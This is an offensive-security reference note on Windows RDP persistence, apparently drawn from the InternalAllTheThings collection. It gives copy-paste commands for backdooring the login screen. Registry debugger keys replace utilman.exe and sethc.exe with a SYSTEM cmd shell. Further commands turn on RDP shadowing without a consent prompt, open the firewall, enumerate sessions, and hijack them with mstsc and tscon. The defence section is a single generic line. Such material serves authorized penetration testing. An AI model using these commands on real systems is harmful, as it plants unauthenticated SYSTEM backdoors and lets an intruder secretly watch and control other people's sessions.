---
title: RDP - Persistence
type: technique
tags: [persistence, rdp, reference-import, windows]
phase: post-exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# RDP - Persistence

## What it is

An RDP backdoor is a malicious technique where an attacker replaces the legitimate binary files of utility manager (utilman.exe) or sticky keys (sethc.exe) with a command prompt (cmd.exe) executable. This allows the attacker to gain unauthorized access to the system by launching a command prompt when the ease of access or sticky keys button is pressed on the login screen, bypassing the need for authentic credentials.

## How it works

RDP backdoors replace Windows accessibility binaries (`sethc.exe` for Sticky Keys, `utilman.exe` for Utility Manager) with `cmd.exe` or another shell, which Windows executes as SYSTEM when the user presses the accessibility shortcut on the login screen. This provides a pre-authentication SYSTEM shell accessible over RDP without credentials, surviving user password changes and reboots. The technique requires physical or remote access to replace the target binary, typically performed after initial compromise by an administrator account.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## RDP Backdoor

An RDP backdoor is a malicious technique where an attacker replaces the legitimate binary files of utility manager (utilman.exe) or sticky keys (sethc.exe) with a command prompt (cmd.exe) executable. This allows the attacker to gain unauthorized access to the system by launching a command prompt when the ease of access or sticky keys button is pressed on the login screen, bypassing the need for authentic credentials.

### utilman.exe

At the login screen, press Windows Key+U, and you get a cmd.exe window as SYSTEM.

```powershell
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```

### sethc.exe

Hit F5 a bunch of times when you are at the RDP login screen.

```powershell
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```

## RDP Shadowing

RDP shadowing is a feature of Remote Desktop Protocol (RDP) that allows a remote user to view or control another user's active RDP session on a Windows computer. This feature is typically used for remote assistance, training, or collaboration purposes, allowing one user to observe or take control of another user's desktop, applications, and input devices as if they were physically present at the computer.

**Requirements**

* `TermService` must be running

```ps1
sc.exe \\MYSERVER query TermService
sc.exe \\MYSERVER start TermService
```

* `SYSTEM` privilege or the account's password

**Enable RDP Shadowing**

Shadow Remote Desktop Session can be enabled by editing the `HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services` registry key.

| Value | Name                  | Description |
| ----- | --------------------- | --- |
|   0   | Disable               | Remote control is disabled. |
|   1   | EnableInputNotify     | The user of remote control has full control of the user's session, with the user's permission. |
|   2   | EnableInputNoNotify   | The user of remote control has full control of the user's session; the user's permission is not required. |
|   3   | EnableNoInputNotify   | The user of remote control can view the session remotely, with the user's permission; the remote user cannot actively control the session. |
|   4   | EnableNoInputNoNotify | The user of remote control can view the session remotely, but not actively control the session; the user's permission is not required. |

Usually you want to be able to see and interact with the Remote Desktop: option 2 `EnableInputNoNotify`.

```ps1
reg.exe query "\\MYSERVER\HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services" /V Shadow
reg.exe add "\\MYSERVER\HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services" /V Shadow /T REG_DWORD /D 2 /F
```

If you encounter any trouble with the network, enable the `Remote Desktop - Shadow (TCP-In)` firewall rule.

```ps1
$so = New-CimSessionOption -Protocol Dcom
$s = New-CimSession -ComputerName MYSERVER -SessionOption $so
$fwrule = Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName="Remote Desktop - Shadow (TCP-In)"' -CimSession $s
$fwrule | Invoke-CimMethod -MethodName Enable
```

**Enumerate active users**

Query to enumerate active users on the machine.

```ps1
quser.exe /SERVER:MYSERVER
query.exe user /server:MYSERVER
qwinsta.exe /server:MYSERVER
```

**Use the shadow mode**

Use the `noConsentPrompt` parameter and specify the session ID obtained from the previous command.

```ps1
MSTSC [/v:<server[:port]>] /shadow:<sessionID> [/control] [/noConsentPrompt]
mstsc /v:SRV2016 /shadow:1 /noConsentPrompt
mstsc /v:SRV2016 /shadow:1 /noConsentPrompt /control
```

On older version you have to use  `tscon.exe` instead.

```ps1
psexec -s cmd
cmd /k tscon 2 /dest:console
```

## References

* [Spying on users using Remote Desktop Shadowing - Living off the Land - Mar 26, 2021 - @bitsadmin](https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing)
* [RDP Hijacking for Lateral Movement with tscon - ired.team - 2019](https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

Tool references are inline in **Methodology**; see the `tools/` pages for CLI usage.

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
